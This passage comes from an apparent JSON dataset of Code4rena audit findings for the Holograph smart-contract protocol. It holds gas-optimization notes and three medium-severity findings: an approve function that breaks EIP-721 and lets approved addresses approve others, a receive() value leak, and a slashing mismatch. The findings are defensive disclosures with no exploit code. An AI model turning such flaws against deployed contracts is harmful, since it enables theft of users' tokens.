require(erc20.transfer(addresses[i], sending), \"PA1D: Couldn't transfer token\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::460 => require(matched, \"PA1D: sender not authorized\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::472 => require(addresses.length == bps.length, \"PA1D: missmatched array lenghts\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::477 => require(totalBp == 10000, \"PA1D: bps down't equal 10000\");\n2022-10-holograph/contracts/module/LayerZeroModule.sol::159 => require(!_isInitialized(), \"HOLOGRAPH: already initialized\");\n2022-10-holograph/contracts/module/LayerZeroModule.sol::235 => require(msg.sender == address(_operator()), \"HOLOGRAPH: operator only call\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-13-use-custom-errors-rather-than-revertrequire-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5624",
      "title": "[G-12] abi.encode() is less efficient than abi.encodePacked()",
      "impact": "GAS",
      "content": "\nuse abi.encodePacked() where possible to save gas\n\n```\n2022-10-holograph/contracts/HolographFactory.sol::252 => abi.encode(abi.encode(config.chainType, holograph, config.contractType, sourceContractAddress), config.initCode)\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::409 => return (Holographable.bridgeOut.selector, abi.encode(from, to, amount, data));\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::471 => abi.encode(\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::260 => abi.encodeWithSignature(\"initPA1D(bytes)\", abi.encode(address(this), uint256(contractBps)))\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::426 => return (Holographable.bridgeOut.selector, abi.encode(from, to, tokenId, data));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-12-abiencode-is-less-efficient-than-abiencodepacked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5623",
      "title": "[G-11] <x> += <y> costs more gas than <x> = <x> + <y> for state variables",
      "impact": "GAS",
      "content": "\nuse <x> = <x> + <y> or <x> = <x> - <y> instead to save gas\n\n```\n2022-10-holograph/contracts/HolographFactory.sol::328 => v += 27;\n2022-10-holograph/contracts/HolographOperator.sol::378 => _bondedAmounts[job.operator] -= amount;\n2022-10-holograph/contracts/HolographOperator.sol::382 => _bondedAmounts[msg.sender] += amount;\n2022-10-holograph/contracts/HolographOperator.sol::834 => _bondedAmounts[operator] += amount;\n2022-10-holograph/contracts/HolographOperator.sol::1175 => position -= threshold;\n2022-10-holograph/contracts/HolographOperator.sol::1177 => current += (current / _operatorThresholdDivisor) * (position / _operatorThresholdStep);\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::633 => _totalSupply -= amount;\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::685 => _totalSupply += amount;\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::686 => _balances[to] += amount;\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::702 => _balances[recipient] += amount;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-11-x--y-costs-more-gas-than-x--x--y-for-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "5622",
      "title": "[G-10] ++i/i++ should be unchecked{++i}/unchecked{i++} when it is not possible for them to overflow, for example when used in for- and while-loops",
      "impact": "GAS",
      "content": "\nThe unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::781 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/HolographOperator.sol::871 => for (uint256 i = _operatorPods.length; i <= pod; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::307 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::323 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::340 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::356 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::394 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::414 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::432 => for (uint256 t = 0; t < tokenAddresses.length; t++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-10-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-for-example-when-used-in-for--and-while-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "5621",
      "title": "[G-09] Using bools for storage incurs overhead",
      "impact": "GAS",
      "content": "\nBooleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.\nUse uint256(1) and uint256(2) for true/false instead\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::198 => mapping(bytes32 => bool) private _failedJobs;\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::196 => mapping(address => mapping(address => bool)) private _operatorApprovals;\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::206 => mapping(uint256 => bool) private _burnedTokens;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-09-using-bools-for-storage-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5620",
      "title": "[G-08] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\nWhen using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::208 => uint32 private _operatorTempStorageCounter;\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::181 => uint8 private _decimals;\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::160 => uint16 private _bps;\n2022-10-holograph/contracts/module/LayerZeroModule.sol::265 => (uint128 dstPriceRatio, uint128 dstGasPriceInWei) = _getPricing(lz, lzDestChain);\n2022-10-holograph/contracts/module/LayerZeroModule.sol::289 => (uint128 dstPriceRatio, uint128 dstGasPriceInWei) = _getPricing(lz, lzDestChain);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5619",
      "title": "[G-07] Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. \n\n```\n2022-10-holograph/contracts/HolographBridge.sol::155 => constructor() {}\n2022-10-holograph/contracts/HolographFactory.sol::136 => constructor() {}\n2022-10-holograph/contracts/HolographOperator.sol::233 => constructor() {}\n2022-10-holograph/contracts/HolographOperator.sol::1209 => receive() external payable {}\n2022-10-holograph/contracts/abstract/ERC20H.sol::133 => constructor() {}\n2022-10-holograph/contracts/abstract/ERC20H.sol::212 => receive() external payable {}\n2022-10-holograph/contracts/abstract/ERC721H.sol::133 => constructor() {}\n2022-10-holograph/contracts/abstract/ERC721H.sol::212 => receive() external payable {}\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::211 => constructor() {}\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::251 => receive() external payable {}\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::231 => constructor() {}\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::962 => receive() external payable {}\n2022-10-holograph/contracts/enforcer/Holographer.sol::140 => constructor() {}\n2022-10-holograph/contracts/enforcer/Holographer.sol::223 => receive() external payable {}\n2022-10-holograph/contracts/enforcer/PA1D.sol::166 => constructor() {}\n2022-10-holograph/contracts/module/LayerZeroModule.sol::151 => constructor() {}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-07-empty-blocks-should-be-removed-or-emit-something",
      "tags": [],
      "finders": []
    },
    {
      "id": "5618",
      "title": "[G-06] Functions guaranteed to revert when called by normal users can be marked payable",
      "impact": "GAS",
      "content": "\nIf a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost\n\n```\n2022-10-holograph/contracts/HolographBridge.sol::452 => function setFactory(address factory) external onlyAdmin {\n2022-10-holograph/contracts/HolographBridge.sol::472 => function setHolograph(address holograph) external onlyAdmin {\n2022-10-holograph/contracts/HolographBridge.sol::502 => function setOperator(address operator) external onlyAdmin {\n2022-10-holograph/contracts/HolographBridge.sol::522 => function setRegistry(address registry) external onlyAdmin {\n2022-10-holograph/contracts/HolographFactory.sol::280 => function setHolograph(address holograph) external onlyAdmin {\n2022-10-holograph/contracts/HolographFactory.sol::300 => function setRegistry(address registry) external onlyAdmin {\n2022-10-holograph/contracts/HolographOperator.sol::949 => function setBridge(address bridge) external onlyAdmin {\n2022-10-holograph/contracts/HolographOperator.sol::969 => function setHolograph(address holograph) external onlyAdmin {\n2022-10-holograph/contracts/HolographOperator.sol::989 => function setInterfaces(address interfaces) external onlyAdmin {\n2022-10-holograph/contracts/HolographOperator.sol::1009 => function setMessagingModule(address messagingModule) external onlyAdmin {\n2022-10-holograph/contracts/HolographOperator.sol::1029 => function setRegistry(address registry) external onlyAdmin {\n2022-10-holograph/contracts/HolographOperator.sol::1049 => function setUtilityToken(address utilityToken) external onlyAdmin {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::380 => function bridgeIn(uint32 fromChain, bytes calldata payload) external onlyBridge returns (bytes4) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::415 => function holographBridgeMint(address to, uint256 amount) external onlyBridge returns (bytes4) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::549 => function sourceBurn(address from, uint256 amount) external onlySource {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::556 => function sourceMint(address to, uint256 amount) external onlySource {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::563 => function sourceMintBatch(address[] calldata wallets, uint256[] calldata amounts) external onlySource {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::399 => function bridgeIn(uint32 fromChain, bytes calldata payload) external onlyBridge returns (bytes4) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::500 => function sourceBurn(uint256 tokenId) external onlySource {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::508 => function sourceMint(address to, uint224 tokenId) external onlySource {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::520 => function sourceGetChainPrepend() external view onlySource returns (uint256) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::577 => function sourceTransfer(address to, uint256 tokenId) external onlySource {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::320 => function setBridge(address bridge) external onlyAdmin {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::340 => function setInterfaces(address interfaces) external onlyAdmin {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::360 => function setLZEndpoint(address lZEndpoint) external onlyAdmin {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::380 => function setOperator(address operator) external onlyAdmin {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::441 => function setBaseGas(uint256 baseGas) external onlyAdmin {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::470 => function setGasPerByte(uint256 gasPerByte) external onlyAdmin {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-06-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "5617",
      "title": "[G-05] Use calldata instead of memory",
      "impact": "GAS",
      "content": "\nUse calldata instead of memory for function parameters saves gas if the function argument is only read.\n\n```\n2022-10-holograph/contracts/HolographBridge.sol::162 => function init(bytes memory initPayload) external override returns (bytes4) {\n2022-10-holograph/contracts/HolographFactory.sol::143 => function init(bytes memory initPayload) external override returns (bytes4) {\n2022-10-holograph/contracts/HolographOperator.sol::240 => function init(bytes memory initPayload) external override returns (bytes4) {\n2022-10-holograph/contracts/abstract/ERC20H.sol::140 => function init(bytes memory initPayload) external virtual override returns (bytes4) {\n2022-10-holograph/contracts/abstract/ERC721H.sol::140 => function init(bytes memory initPayload) external virtual override returns (bytes4) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::218 => function init(bytes memory initPayload) external override returns (bytes4) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::238 => function init(bytes memory initPayload) external override returns (bytes4) {\n2022-10-holograph/contracts/enforcer/Holographer.sol::147 => function init(bytes memory initPayload) external override returns (bytes4) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::173 => function init(bytes memory initPayload) external override returns (bytes4) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::185 => function initPA1D(bytes memory initPayload) external returns (bytes4) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::365 => function _getTokenAddress(string memory tokenName) private view returns (address tokenAddress) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::683 => function getTokenAddress(string memory tokenName) public view returns (address) {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::158 => function init(bytes memory initPayload) external override returns (bytes4) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-05-use-calldata-instead-of-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "5616",
      "title": "[G-04] Long Revert Strings",
      "impact": "GAS",
      "content": "\nShortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met.\n\nIf the contract(s) in scope allow using Solidity >=0.8.4, consider using Custom Errors as they are more gas efficient while allowing developers to describe the error in detail using NatSpec.\n\n```\n2022-10-holograph/contracts/enforcer/PA1D.sol::411 => require(balance > 10000, \"PA1D: Not enough tokens to transfer\");\n2022-10-holograph/contracts/enforcer/PA1D.sol::435 => require(balance > 10000, \"PA1D: Not enough tokens to transfer\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-04-long-revert-strings",
      "tags": [],
      "finders": []
    },
    {
      "id": "5615",
      "title": "[G-03] Using > 0 costs more gas than != 0 when used on a uint in a require() statement",
      "impact": "GAS",
      "content": "\nWhen dealing with unsigned integer types, comparisons with != 0 are cheaper then with > 0. This change saves 6 gas per instance\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::309 => require(_operatorJobs[hash] > 0, \"HOLOGRAPH: invalid job\");\n2022-10-holograph/contracts/HolographOperator.sol::350 => require(timeDifference > 0, \"HOLOGRAPH: operator has time\");\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::815 => require(tokenId > 0, \"ERC721: token id cannot be zero\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-03-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5614",
      "title": "[G-02] Cache Array Length Outside of Loop",
      "impact": "GAS",
      "content": "\nCaching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.\n\n```\n2022-10-holograph/contracts/HolographOperator.sol::871 => for (uint256 i = _operatorPods.length; i <= pod; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::432 => for (uint256 t = 0; t < tokenAddresses.length; t++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-02-cache-array-length-outside-of-loop",
      "tags": [],
      "finders": []
    },
    {
      "id": "5613",
      "title": "[G-01] Don't Initialize Variables with Default Value",
      "impact": "GAS",
      "content": "\nUninitialized variables are assigned with the types default value. Explicitly initializing a variable with it's default value costs unnecesary gas.\n\n```\n2022-10-holograph/contracts/HolographBridge.sol::380 => uint256 fee = 0;\n2022-10-holograph/contracts/HolographOperator.sol::310 => uint256 gasLimit = 0;\n2022-10-holograph/contracts/HolographOperator.sol::311 => uint256 gasPrice = 0;\n2022-10-holograph/contracts/HolographOperator.sol::781 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::357 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/HolographERC721.sol::716 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::307 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::323 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::340 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::356 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::394 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::414 => for (uint256 i = 0; i < length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::432 => for (uint256 t = 0; t < tokenAddresses.length; t++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::437 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::454 => for (uint256 i = 0; i < addresses.length; i++) {\n2022-10-holograph/contracts/enforcer/PA1D.sol::474 => for (uint256 i = 0; i < addresses.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "#g-01-dont-initialize-variables-with-default-value",
      "tags": [],
      "finders": []
    },
    {
      "id": "5612",
      "title": "[M-19] `HolographERC721.approve` not EIP-721 compliant",
      "impact": "MEDIUM",
      "content": "\n[HolographERC721.sol#L272](https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272)<br>\n\nAccording to EIP-721, we have for `approve`:\n\n```solidity\n///  Throws unless `msg.sender` is the current NFT owner, or an authorized\n///  operator of the current owner.\n```\n\nAn operator in the context of EIP-721 is someone who was approved via `setApprovalForAll`:\n\n```solidity\n/// @notice Enable or disable approval for a third party (\"operator\") to manage\n///  all of `msg.sender`'s assets\n/// @dev Emits the ApprovalForAll event. The contract MUST allow\n///  multiple operators per owner.\n/// @param _operator Address to add to the set of authorized operators\n/// @param _approved True if the operator is approved, false to revoke approval\nfunction setApprovalForAll(address _operator, bool _approved) external;\n```\n\nBesides operators, there are also approved addresses for a token (for which `approve` is used). However, approved addresses can only transfer the token, see for instance the `safeTransferFrom` description:\n\n```solidity\n/// @dev Throws unless `msg.sender` is the current owner, an authorized\n///  operator, or the approved address for this NFT.\n```\n\n`HolographERC721` does not distinguish between authorized operators and approved addresses when it comes to the `approve` function. Because `_isApproved(msg.sender, tokenId)` is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).\n\n### Proof Of Concept\n\nBob calls `approve` to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue `HolographERC721` did not follow EIP-721, it was possible.\n\n### Recommended Mitigation Steps\n\nFollow the EIP, i.e. do not allow approved addresses to approve other addresses.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1307792766):**\n > Originally, this was a design decision, but we will update the highlighted code to follow the ERC721 spec to avoid unknown consequences.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1320957930):**\n > Consider as duplicate of [`#203`](https://github.com/code-423n4/2022-10-holograph-findings/issues/203)\n\n**[Lambda (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1322711108):**\n > @gzeon - Isn't this a different issue than [`#203`](https://github.com/code-423n4/2022-10-holograph-findings/issues/203)? Both are related to ERC721 compliance, but they have different causes (wrong `safeTransferFrom` vs. wrong `approve`), very different impacts (failing transfers vs. unintended permissions), and the sponsor will implement different fixes for them (that for instance would not make sense to review together in a fix review)\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1328124102):**\n > @Lambda - Fair.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the HolographERC721 contract, which does not follow the EIP-721 standard for the `approve` function. According to the EIP-721, only authorized operators should be able to approve other addresses, but the contract does not distinguish between authorized operators and approved addresses. This means that approved addresses can approve other addresses, which can lead to malicious actors stealing tokens. The proof of concept given is an example of how this vulnerability can be exploited, and the recommended mitigation step is to follow the EIP-721 and not allow approved addresses to approve other addresses.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/205",
      "tags": [
        "ERC721",
        "Approve"
      ],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "5611",
      "title": "[M-18] Leak of value when interacting with an ERC721 enforcer contract",
      "impact": "MEDIUM",
      "content": "\n[HolographERC721.sol#L962](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L962)<br>\n\nHolographERC721.sol is an enforcer of the ERC721 standard. In its fallback function, it calls the actual implementation in order to handle additional logic.\n\nIf Holographer is called with no calldata and some msg.value, the call will reach the  receive() function, which does not forward the call down to the implementation.\n\nThis can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value. For example, it can mint the next available tokenID and credit it to the user. Since this logic is never reached, the entire msg.value is just leaked.\n\n### Impact\n\nLeak of value when interacting with an NFT using the receive() or fallback() callback. Note that if NFT implements fallback OR receive() function, execution will never reach either of them from the enforcer's receive() function.\n\n### Recommended Mitigation Steps\n\nFunnel receive() empty calls down to the implementation.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1306627063):**\n > Receive function will need to be updated to pass value down like the fallback function\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1306732804):**\n > Upon further thoughts, believe it may qualify as high severity because it is a leak of value without requiring user error.\n\n**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1319569845):**\n > This is intended behavior, `mgs.value` is never leaked directly to custom implementations. For ERC721 there is a direct and secure method of withdrawing that value via the PA1D contract logic.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1319747993):**\n > Yeah, but the withdrawal in PA1D will split the money between payout addresses. If developer implemented an ERC721 with receive() fallback, this call would be intended for that logic but instead the money is now treated as royalties to payout. \n\n**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1320921141):**\n > Developer can implement custom payable functions that guarantee msg.value transfer to their custom implementation. Receive function is reserved for royalty payouts that directly send funds to contract address. Plus it’s expected to be limited to 21k gas units, so there is no real use case where any logic can be accomplished with that much gas.\n\n**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1322294719):**\n > That being said, this is a valid issue and sponsor confirms it. There is no clearly communicated code/documentation that explains this limitation to developers. Will make an attempt at mitigating this potential issue from happening on custom implementation side by providing clearer language and also adding revert functionality in the receive functions to get the attention of developers that might have missed this.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the HolographERC721.sol contract, which is an enforcer of the ERC721 standard. The bug is related to the receive() function, which does not forward the call down to the implementation if Holographer is called with no calldata and some msg.value. This can be a serious value leak issue as the underlying implementation may have valid behavior for handling sending of value. As a result, the entire msg.value is just leaked. This bug is an example of a value leak when interacting with an NFT using the receive() or fallback() callback. The bug was discovered through manual audit. The recommended mitigation step for this issue is to funnel receive() empty calls down to the implementation.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/468",
      "tags": [
        "Needless receive()"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "5610",
      "title": "[M-17] Wrong slashing calculation rewards for operator that did not do his job",
      "impact": "MEDIUM",
      "content": "\nWrong slashing calculation may create unfair punishment for operators that accidentally forgot to execute their job.\n\n### Proof of Concept\n\n[Docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification): If an operator acts maliciously, a percentage of their bonded HLG will get slashed. Misbehavior includes (i) downtime, (ii) double-signing transactions, and (iii) abusing transaction speeds. 50% of the slashed HLG will be rewarded to the next operator to execute the transaction, and the remaining 50% will be burned or returned to the Treasury.\n\nThe docs also include a guide for the number of slashes and the percentage of bond slashed. However, in the contract, there is no slashing of percentage fees. Rather, the whole \\_getBaseBondAmount() fee is [slashed from the job.operator instead.](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)\n\n            uint256 amount = _getBaseBondAmount(pod);\n            /**\n             * @dev select operator that failed to do the job, is slashed the pod base fee\n             */\n            _bondedAmounts[job.operator] -= amount;\n            /**\n             * @dev the slashed amount is sent to current operator\n             */\n            _bondedAmounts[msg.sender] += amount;\n\nDocumentation states that only a portion should be slashed and the number of slashes should be noted down.\n\n### Recommended Mitigation Steps\n\nImplement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/307#issuecomment-1306684590):**\n > Valid. The docs are not in sync with the code, but it will be adjusted to handle this correctly.\n\n**[alexanderattar (Holograph) resolved and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/307#issuecomment-1351759231):**\n > We have changed the slashing logic to use base bonding amount instead of percentage based approach.\n\n\n\n***\n\n",
